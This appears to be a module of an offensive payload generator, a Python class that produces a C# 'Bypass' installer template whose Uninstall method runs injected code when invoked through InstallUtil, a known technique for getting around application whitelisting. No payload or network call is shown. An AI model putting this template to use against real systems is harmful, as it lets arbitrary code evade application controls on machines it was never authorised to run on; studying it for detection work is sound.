from string import Template

class installutil:
    def __init__(self, arguments):
        pass

    def imports(self) -> list[str]:
        return ['using System;',
                'using System.ComponentModel;',
                'using System.Configuration.Install;']

    def compilerOptions(self) -> list[str]:
        return ['dll']

    def template(self) -> str:
        return """
{imports}

[RunInstaller(true)]
public class Bypass : Installer
{{

    {codeblocks}

    public override void Uninstall(System.Collections.IDictionary savedState)
    {{
        {template}
    }}
}}
"""